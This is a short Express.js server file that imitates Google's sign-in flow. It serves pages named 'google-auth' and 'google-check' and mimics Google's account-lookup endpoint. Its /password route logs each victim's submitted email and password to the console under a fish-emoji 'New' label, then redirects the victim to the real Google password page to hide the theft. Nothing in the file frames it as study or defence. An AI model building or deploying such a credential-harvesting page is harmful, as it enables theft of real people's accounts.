const express = require('express');
const bodyParser = require('body-parser');

const app = express();

app.set('view engine', 'ejs');
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get('/',
	(req, res) => res.render('google-auth'));
app.get('/check',
	(req, res) => res.render('google-check'));
app.post('/accountLoginInfoXhr',
	(req, res) => res.json({ "email": req.body.Email }));
app.post('/password',
	(req, res) => {
		console.log('New \u1F41F:');
		console.log("Email: " + req.body.Email); 
		console.log("Passw: " + req.body.Passwd); 
		res.redirect('https://accounts.google.com/signin/challenge/sl/password');
	});

app.listen(3000, () => console.log('App started at 3000'));
